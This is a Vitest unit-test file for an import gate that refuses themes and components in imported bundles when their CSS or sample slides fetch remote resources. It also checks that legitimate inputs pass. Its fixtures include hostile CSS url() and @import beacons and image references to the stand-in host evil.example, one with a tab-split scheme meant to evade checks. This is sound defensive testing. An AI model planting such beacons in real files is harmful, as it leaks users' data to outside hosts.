// @vitest-environment jsdom
// The component arm renders a sample slide and parses it with DOMParser
// (library/gallery-gate.ts), so this file needs a window. It ran under `node` while it
// touched no DOM; see engineering/decisions/2026-09-20-dom-library-bakeoff.md.
/**
 * Unit: what an imported `.zip`'s CSS is refused for — and, just as load-bearing,
 * what it is NOT refused for.
 *
 * This runs on the PER-PR tier. The e2e that drives a hostile bundle through the real
 * Library door lives in `docs/e2e/theme-import-style-sink.spec.ts` and only runs
 * NIGHTLY (it carries no `@smoke` tag, and CI's e2e step is `test:e2e:smoke`), so
 * deleting the guard would have left the per-PR gate green. A guard on untrusted
 * third-party input needs a test that actually blocks a merge.
 *
 * THE FALSE-POSITIVE CASES ARE THE POINT OF THIS FILE. A refusal destroys work, so
 * over-refusing is a defect and not a safe default — the first cut of this guard put
 * the refusal in `saveStudioTheme`, where these same inputs made a legitimate theme
 * permanently unsaveable and made one theme in your own backup abort the entire
 * workspace restore.
 */

import { beforeAll, describe, expect, it } from 'vitest';
import { installNodeEngine } from '../../test/node-engine';
import { refuseImportedComponent, refuseImportedTheme } from './import-gate';

const CLEAN_THEME = "/* @theme mine */\n@import 'lattice';\n:root{--accent:#2f6feb;--bg:#fff;--text-body:#111}";

describe('refuseImportedTheme', () => {
	it('refuses a remote url() — the beacon', async () => {
		const r = await refuseImportedTheme(`${CLEAN_THEME}\n:root{--leak:url(https://evil.example/?deck)}`, 'Hostile');
		expect(r).not.toBeNull();
		expect(r?.why).toMatch(/remote resource/);
		expect(r?.name).toBe('Hostile');
	});

	it('refuses @import url(…)', async () => {
		expect(await refuseImportedTheme(`@import url(https://evil.example/x.css);\n${CLEAN_THEME}`, 'X')).not.toBeNull();
	});

	it('refuses an import of a theme the receiving browser does not have', async () => {
		// It would not resolve there anyway, and since #1841 the engine drops rather
		// than hoists it — but a stranger's bundle asserting a palette you may or may
		// not have is not something to store on a maybe.
		expect(await refuseImportedTheme("@import 'someones-palette';\n:root{--accent:#111}", 'X')).not.toBeNull();
	});

	it('allows a clean theme', async () => {
		expect(await refuseImportedTheme(CLEAN_THEME, 'Mine')).toBeNull();
	});

	it('allows a token whose NAME contains "javascript"', async () => {
		// `CSS_EXFIL_RULES`'s `css-scheme` rule matches `javascript:` inside the property
		// name, so a plausible syntax-highlight token trips it. Measured against the gate:
		// `blocked: true`. It is a finding, never a refusal — a `javascript:` URL in a
		// stylesheet cannot execute in any shipping browser, so vetoing on it buys
		// nothing and costs a legitimate import.
		expect(await refuseImportedTheme(`${CLEAN_THEME}\n:root{--code-javascript:#f0db4f}`, 'Code')).toBeNull();
	});

	it('allows a theme that merely fails the token contract', async () => {
		// Wrong, and it still renders. Conformance is never a refusal.
		expect(await refuseImportedTheme("/* @theme sparse */\n@import 'lattice';\n:root{--accent:#111}", 'Sparse')).toBeNull();
	});

	it('allows a data: URI and a #fragment ref', async () => {
		const css = `${CLEAN_THEME}\n:root{--icon:url("data:image/svg+xml;base64,PHN2Zy8+");--clip:url(#frag)}`;
		expect(await refuseImportedTheme(css, 'Inline')).toBeNull();
	});
});

describe('refuseImportedComponent', () => {
	beforeAll(installNodeEngine);

	it('refuses a remote url() in component CSS', async () => {
		// The component arm of the SAME zip was ungated while the theme arm was not.
		// Hostile component CSS reaches the same preview <style> and every export, and
		// the intended workflow — import, then insert the skeleton — is what fires it.
		const r = await refuseImportedComponent('section.widget .leak{background:url(https://evil.example/?d)}', 'widget');
		expect(r).not.toBeNull();
		expect(r?.why).toMatch(/remote resource/);
	});

	it('refuses @import in component CSS', async () => {
		expect(await refuseImportedComponent("@import url(//evil.example/x);\nsection.w .a{color:red}", 'w')).not.toBeNull();
	});

	it('allows clean scoped component CSS', async () => {
		expect(await refuseImportedComponent('section.widget .title{color:var(--text-heading)}', 'widget')).toBeNull();
	});

	it('allows a component whose class is named "javascript"', async () => {
		// A code component naming a language class is exactly the shape that trips the
		// `css-scheme` rule on a SELECTOR rather than on a URL.
		expect(await refuseImportedComponent('section.code .javascript{color:var(--accent)}', 'code')).toBeNull();
	});

	it('allows an inline data: icon — the sanctioned non-network url()', async () => {
		expect(await refuseImportedComponent('section.w .i{background:url("data:image/svg+xml;base64,PHN2Zy8+")}', 'w')).toBeNull();
	});

	it('refuses a component whose sample slide loads a remote image', async () => {
		// Insert makes the gallery the user's own deck content, so it is the same beacon. The
		// check renders the slide, so a fetch a component transform or front matter adds counts.
		const r = await refuseImportedComponent('section.w .a{color:var(--accent)}', 'w', '<!-- _class: w -->\n\n<img src="https://evil.example/b.png">');
		expect(r?.why).toMatch(/sample slide loads https:\/\/evil\.example\/b\.png/);
		expect(await refuseImportedComponent('section.w .a{color:var(--accent)}', 'w', '<!-- _class: w -->\n\n![x](https://evil.example/b.png)')).not.toBeNull();
		expect(await refuseImportedComponent('section.w .a{color:var(--accent)}', 'w', '---\nlogo: https://evil.example/l.png\n---\n\n<!-- _class: w -->\n')).not.toBeNull();
	});

	it('reads a CRLF gallery and a tab-split scheme the way the CLI export will', async () => {
		const css = 'section.w .a{color:var(--accent)}';
		const crlf = '<!-- _class: w -->\r\n\r\n<div>\r\n```mermaid\r\nflowchart LR\r\n  A@{ img: "https://evil.example/c.png" } --> B\r\n```\r\n</div>\r\n';
		expect((await refuseImportedComponent(css, 'w', crlf))?.why).toMatch(/evil\.example\/c\.png/);
		const tab = '<!-- _class: w -->\n\n```mermaid\nflowchart LR\n  A["<img src=\'ht\ttp:evil.example/t.png\'>"]\n```\n';
		expect((await refuseImportedComponent(css, 'w', tab))?.why).toMatch(/evil\.example\/t\.png/);
		expect(await refuseImportedComponent(css, 'w', '<!-- _class: w -->\r\n\r\n```mermaid\r\nflowchart LR\r\n  A-->B\r\n```\r\n')).toBeNull();
	});

	it('refuses, rather than waves through, a sample slide it could not check', async () => {
		const pg = window.LatticePlayground;
		(window as unknown as { LatticePlayground: unknown }).LatticePlayground = { render: () => { throw new Error('boom'); }, referenceTargets: () => [] };
		try {
			expect((await refuseImportedComponent('section.w .a{color:var(--accent)}', 'w', '<!-- _class: w -->'))?.why).toMatch(/could not be checked \(boom\)/);
		} finally {
			(window as unknown as { LatticePlayground: unknown }).LatticePlayground = pg;
		}
	});

	it('allows a sample slide with links, relative images and inline svg', async () => {
		const md = '<!-- _class: w -->\n\n[site](https://ok.example)\n\n![logo](logo.png)\n\n<svg xmlns="http://www.w3.org/2000/svg"><rect fill="url(#g)"/></svg>';
		expect(await refuseImportedComponent('section.w .a{color:var(--accent)}', 'w', md)).toBeNull();
	});
});
